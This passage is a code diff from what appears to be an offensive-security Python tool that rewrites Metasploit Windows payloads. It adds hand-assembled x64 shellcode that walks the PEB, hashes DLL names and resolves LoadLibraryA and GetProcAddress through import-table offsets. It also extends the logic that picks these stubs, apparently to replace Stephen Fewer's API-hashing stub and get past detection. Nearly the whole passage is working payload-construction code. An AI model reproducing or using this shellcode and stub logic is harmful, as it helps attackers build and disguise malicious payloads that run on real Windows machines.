+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0x49
+            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
+            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0x3f
+            "\x6a\x00"                                          # push 0
+            "\x6a\x00"                                          # push 0
+            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
+            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
+            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
+            "\x48\x89\xe2"                                      # mov rdx, rsp
+            "\x48\x89\xd9"                                      # mov rcx, rbx
+            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
+            "\x4d\x89\xd5"                                      # mov r13, r10
+            "\x41\xff\x17"                                      # call qword ptr [r15]
+            "\x50"                                              # push rax
+            "\x49\x89\xe6"                                      # mov r14, rsp
+            "\x4d\x89\xea"                                      # mov r10, r13
+            "\x48\x83\xc4\x38"                                  # add rsp, 0x38
+
+            , 'iso-8859-1')
+
+        return shellcode
+
+    def ExternOffsetGPA(self):
+        parser_stub = 'offset'
+        importname = 'main_module'
+        self.check_imports()
+        
+        shellcode = bytes(
+            "\xfc"                                              # cld 
+            "\x52"                                              # push rdx
+            "\x51"                                              # push rcx
+            "\x57"                                              # push rdi
+            "\x53"                                              # push rbx
+            "\x56"                                              # push rsi
+            "\x41\x50"                                          # push r8
+            "\x41\x51"                                          # push r9
+            "\x41\x54"                                          # push r12
+            "\x41\x55"                                          # push r13
+            "\x41\x56"                                          # push r14
+            "\x41\x57"                                          # push r15
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x37
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0x2d
+            , 'iso-8859-1'
+            )
+        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
+        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
+        
+        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0x23
+            "\x4c\x89\xea"                                      # mov rdx, r13
+            "\x48\xc7\xc3"                                      # mov rbx,
+            , 'iso-8859-1'
+            )
+        shellcode += struct.pack("<I", self.imp_offset)   #  XXXXX
+                  
+        shellcode +=  bytes("\x4c\x01\xeb"                                      # add rbx, r13
+            "\x49\x89\xdf"                                      # mov r15, rbx
+            "\x48\x31\xd2"                                      # xor rdx, rdx
+            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
+            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
+            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
+            "\x6a\x18"                                          # push 0x18
+            "\x59"                                              # pop rcx
+            "\x4d\x31\xc9"                                      # xor r9, r9
+            "\x48\x31\xc0"                                      # xor rax, rax
+            "\xac"                                              # lodsb al, byte ptr [rsi]
+            "\x3c\x61"                                          # cmp al, 0x61
+            "\x7c\x02"                                          # jl 0x53
+            "\x2c\x20"                                          # sub al, 0x20
+            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
+            "\x41\x01\xc1"                                      # add r9d, eax
+            "\xe2\xed"                                          # loop 0x49
+            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
+            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
+            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
+            "\x75\xd3"                                          # jne 0x3f
+            "\x6a\x00"                                          # push 0
+            "\x6a\x00"                                          # push 0
+            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
+            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
+            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
+            "\x48\x89\xe2"                                      # mov rdx, rsp
+            "\x48\x89\xd9"                                      # mov rcx, rbx
+            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
+            "\x4d\x89\xd5"                                      # mov r13, r10
+            "\x41\xff\x17"                                      # call qword ptr [r15]
+            "\x50"                                              # push rax
+            "\x49\x89\xe6"                                      # mov r14, rsp
+            "\x4d\x89\xea"                                      # mov r10, r13
+            "\x48\x83\xc4\x38"                                  # add rsp, 0x38
+
+            , 'iso-8859-1')
+
+        return shellcode
+
+
 class x86_windows_metasploit:
     
     '''
@@ -1096,7 +1741,7 @@ class x86_windows_metasploit:
         self.__dict__.update(kwargs)
         self.tracker = []
         self.arch = CS_ARCH_X86
-        #self.mode = ''
+        self.mode = ''
         self.syntax = 0
         self.api_hashes = {}
         self.called_apis = []
@@ -1106,7 +1751,6 @@ class x86_windows_metasploit:
         self.DLL_HASH = 0
         self.lla_hash_dict = {}
         self.gpa_hash_dict = {}
-        sys.stderr.write("self.mode %s\n" % self.mode)
         if self.mode == '32':
             self.mode = CS_MODE_32
         elif self.mode == '64':
@@ -1183,6 +1827,7 @@ class x86_windows_metasploit:
                          ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
                          ( 0xE2899612, "wininet.dll!InternetReadFile"),
               ]    
+        
 
     ###############################
     #Modified from Stephen Fewer's hash.py 
@@ -1241,6 +1886,7 @@ class x86_windows_metasploit:
                 #strip it
                 sys.stderr.write("[*] Stripping Stephen Fewers 32bit hash stub \n")
                 self.code = self.code.replace(self.fewerapistub_x86, b'')
+                sys.stderr.write("[*] Length of code after stripping: {0}\n".format(len(self.code)))
                 self.prestine_code = self.code
                 self.mode = CS_MODE_32
         
@@ -1252,8 +1898,8 @@ class x86_windows_metasploit:
                 #self.code = self.code[10:]
                 #now remove SFH stub
                 self.code = re.sub(self.fewerapistub_x64_regex, b'', self.code[10:])
-                sys.stderr.write(self.code.hex())
-                sys.stderr.write("Length of code after stripping: {0}\n".format(len(self.code)))
+                #sys.stderr.write(self.code.hex())
+                sys.stderr.write("[*] Length of code after stripping: {0}\n".format(len(self.code)))
                 self.prestine_code = self.code
                 self.mode = CS_MODE_64
 
@@ -1516,7 +2162,30 @@ class x86_windows_metasploit:
         else:
             self.stubs = stubs_64(self)
 
-        if self.targetbinary == '' and self.dll == '':
+        if self.parser_stub.lower() == 'OffsetGPA'.lower():
+            self.check_apis()
+            self.hash(self.dll)
+            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'main_module'}
+            sys.stderr.write("[*] Using OffsetGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
+                self.DLL_INFO['importname']))
+            self.selected_payload = self.stubs.OffsetGPA()
+
+        elif self.parser_stub.lower() == 'ExternOffsetGPA'.lower():
+            self.check_apis()
+            self.hash(self.dll)
+            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'main_module'}
+            sys.stderr.write("[*] Using ExternOffsetGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
+                self.DLL_INFO['importname']))
+            self.selected_payload = self.stubs.ExternOffsetGPA()
+
+        elif self.parser_stub.lower() == 'ExternGPAFC'.lower():
+            self.hash(self.dll)
+            self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': 'kernelbase.dll'}
+            sys.stderr.write("[*] Using ExternGPAFC from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
+                self.DLL_INFO['importname']))
+            self.selected_payload = self.stubs.loaded_gpafc_iat_parser_stub()
+
+        elif self.targetbinary == '' and self.dll == '':
             if self.parser_stub.lower() == 'GPA'.lower():
                 sys.stderr.write("[*] Using GPA Stub\n")
                 self.selected_payload = self.stubs.gpa_parser_stub()
@@ -1558,6 +2227,7 @@ class x86_windows_metasploit:
                 sys.stderr.write("[*] Using LLAGPA stub\n")
                 self.selected_payload = self.stubs.lla_gpa_parser_stub()
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
+            
             elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
                 sys.stderr.write("[*] Using GPA stub\n")
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
@@ -1647,7 +2317,7 @@ class x86_windows_metasploit:
                         
 
                     elif 'mov r10d' in value['mnemonic'] + " " + value['op_str']:
-                        sys.stderr.write('mov r10d \n')
+                        #sys.stderr.write('mov r10d \n')
                         #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                         if len(value['bytes']) == 6:
                             r10d = hex(struct.unpack("<I", value['bytes'][2:])[0])
@@ -1656,7 +2326,7 @@ class x86_windows_metasploit:
                         self.tracker_dict[key]['hash_update'] = newhash
 
                     elif 'mov r10' in value['mnemonic'] + " " + value['op_str']:
-                        sys.stderr.write('mov r10d \n')
+                        #sys.stderr.write('mov r10d \n')
                         #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
                         if len(value['bytes']) == 7:
                             r10d = hex(struct.unpack("<I", value['bytes'][3:])[0])
@@ -1665,7 +2335,7 @@ class x86_windows_metasploit:
                         self.tracker_dict[key]['hash_update'] = newhash
 
                     elif 'movabs r10' in value['mnemonic'] + " " + value['op_str']:
-                        sys.stderr.write('movabs r10d \n')
+                        #sys.stderr.write('movabs r10d \n')
                         if len(value['bytes']) == 10:
                             r10d = hex(struct.unpack("<I", value['bytes'][2:6])[0])
 
@@ -1728,11 +2398,8 @@ class x86_windows_metasploit:
             
             for insn in md.disasm(self.code, 0):
                 
-                width = 50 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
-                sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
-                
-                #"%s" % "".join('\\x{:02x}'.format(x) for x in insn.bytes))
-                
+                #width = 50 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
+                #sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
 
                 tmp_tracker.append([insn.bytes, insn.mnemonic, insn.op_str])
                 tmp = {'bytes': insn.bytes,
@@ -1897,7 +2564,7 @@ class x86_windows_metasploit:
             self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
             
-            sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
+            #sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
             if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                 self.stub += b"\x33\xC0"                        # XOR EAX,EAX
                 self.stub += b"\x50"                            # PUSH EAX
@@ -1906,6 +2573,10 @@ class x86_windows_metasploit:
             elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                 self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
             
+            elif self.DLL_INFO['importname'].lower() == 'kernelbase.dll':
+                self.stub += b"\x6A\x00"                        # Push 0
+                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+        
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                 sys.exit(-1)
@@ -1917,7 +2588,7 @@ class x86_windows_metasploit:
             if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                 self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use
                 self.stub += b"\x50"                            # push EAX
-            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'].lower() == 'kernelbase.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                 self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
@@ -1986,17 +2657,18 @@ class x86_windows_metasploit:
             self.stub += b"\x48\x81\xE9"                        # SUB RCX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
             
-            sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
+            #sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
+            
             if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
                 self.stub += b"\x48\x31\xD2"                        # XOR rdx,rdx
-                # will need to be updated
-                #self.stub += b"\x50"                            # PUSH EAX
-                #self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
-            
+
             elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                 # no need for pushing on stack
-                self.stub += b""                            # PUSH ECX                       ; push on stack for use
+                self.stub += b""                                 # PUSH ECX                       ; push on stack for use
             
+            elif self.DLL_INFO['importname'].lower() == 'kernelbase.dll':
+                self.stub += b"\x4D\x31\xC0"                     # xor r8, r8
+                
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
                 sys.exit(-1)
@@ -2014,7 +2686,7 @@ class x86_windows_metasploit:
                 # this push on x64?? Look at it on x86 (might not be important)
 
                 self.stub += b"\x50"                            # push EAX
-            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'].lower() == 'kernelbase.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
                 self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
             else:
                 sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
@@ -2022,44 +2694,44 @@ class x86_windows_metasploit:
             
             self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
             self.stub += struct.pack("<I", updated_offset + 4)  
-            self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
-            self.stub += b"\x48\x89\xF1"                        # MOV RCX,RSI                    ; mov offset to ecx
-            self.stub += b"\x48\x01\xC1"                        # ADD ECX,EAX                    ; find API location
-            self.stub += b"\x48\x81\xE9"                        # SUB ECX,XX                     ; normalize for ascii value
+            self.stub += b"\x8A\xC5"                                # MOV AL,CH                      ; mov API offset to ECX
+            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
+            self.stub += b"\x48\x01\xC1"                            # ADD ECX,EAX                    ; find API location
+            self.stub += b"\x48\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
             self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
-            self.stub += b"\x48\x87\xD1"                        # xchg rcx, rdx                  ; Use the proper registers for gpa
+            self.stub += b"\x48\x87\xD1"                            # xchg rcx, rdx                  ; Use the proper registers for gpa
             
-            self.stub += b"\x48\x83\xEC\x20"                    # sub rsp, 0x20
-            self.stub += b"\x48\x89\xE5"                             # mov rbp, rsp           # ;save stack
-            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
-            self.stub += b"\x41\xFF\x17"                        # CALL QWORD PTR DS:[r15]        ; Call Getprocaddress(DLL.handle, API)
-            self.stub += b"\x48\x89\xEC"                             # mov rsp, rbp              # restore stack
+            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
+            self.stub += b"\x48\x89\xE5"                            # mov rbp, rsp           # ;save stack
+            self.stub += b"\x48\x83\xE4\xF0"                        # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
+            self.stub += b"\x41\xFF\x17"                            # CALL QWORD PTR DS:[r15]        ; Call Getprocaddress(DLL.handle, API)
+            self.stub += b"\x48\x89\xEC"                            # mov rsp, rbp              # restore stack
             
             # Call API RAX has API
-            self.stub += b"\x48\x83\xC4\x40"                     # SUB RSP, 40 ; align stack
+            self.stub += b"\x48\x83\xC4\x40"                        # SUB RSP, 40 ; align stack
             
-            self.stub += b"\x41\x5f"                 #  pop    r15
-            self.stub += b"\x41\x5e"                 #  pop    r14
-            self.stub += b"\x41\x5d"                 #  pop    r13
-            self.stub += b"\x41\x5c"                 #  pop    r12
-            self.stub += b"\x41\x59"                 #  pop    r9
-            self.stub += b"\x41\x58"                 #  pop    r8
-            self.stub += b"\x5e"                     # pop    rsi
-            self.stub += b"\x5b"                     # pop    rbx
-            self.stub += b"\x5f"                     # pop    rdi
-            self.stub += b"\x59"                     # pop    rcx
-            self.stub += b"\x5a"                     # pop    rdx
-            self.stub += b"\x5D"                                     # pop    rbp (save return addr)
-            self.stub += b"\x48\x83\xE4\xF0"                         # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
-            self.stub += b"\x48\x83\xEC\x20"                         # sub rsp, 0x20
-            self.stub += b"\xFF\xD0"                                 # CALL RAX                       ; call target API
+            self.stub += b"\x41\x5f"                                # pop    r15
+            self.stub += b"\x41\x5e"                                # pop    r14
+            self.stub += b"\x41\x5d"                                # pop    r13
+            self.stub += b"\x41\x5c"                                # pop    r12
+            self.stub += b"\x41\x59"                                # pop    r9
+            self.stub += b"\x41\x58"                                # pop    r8
+            self.stub += b"\x5e"                                    # pop    rsi
+            self.stub += b"\x5b"                                    # pop    rbx
+            self.stub += b"\x5f"                                    # pop    rdi
+            self.stub += b"\x59"                                    # pop    rcx
+            self.stub += b"\x5a"                                    # pop    rdx
+            self.stub += b"\x5D"                                    # pop    rbp (save return addr)
+            self.stub += b"\x48\x83\xE4\xF0"                        # and rsp, 0xfffffffffffffff0 ; 16byte align the stack
+            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
+            self.stub += b"\xFF\xD0"                                # CALL RAX                       ; call target API
             # Recover
             
-            self.stub += b"\x55"                                 # push rbp                       ; push return addr into msf caller
-            self.stub += b"\x48\x8D\x2D\x00\x00\x00\x00"         # lea rbp, [rip]                   ; get pc
-            self.stub += b"\x48\x81\xED"                         # SUB RBP,XX                     ; To reset the location of the api call back
+            self.stub += b"\x55"                                    # push rbp                       ; push return addr into msf caller
+            self.stub += b"\x48\x8D\x2D\x00\x00\x00\x00"            # lea rbp, [rip]                   ; get pc
+            self.stub += b"\x48\x81\xED"                            # SUB RBP,XX                     ; To reset the location of the api call back
             self.stub += struct.pack("<I", len(self.selected_payload) + len(self.stub) - 3)   
-            self.stub += b"\xC3"                                 # RETN                           ; return back into msf payload logic
+            self.stub += b"\xC3"                                    # RETN                           ; return back into msf payload logic
 
 
             self.jump_stub = b"\xe8"
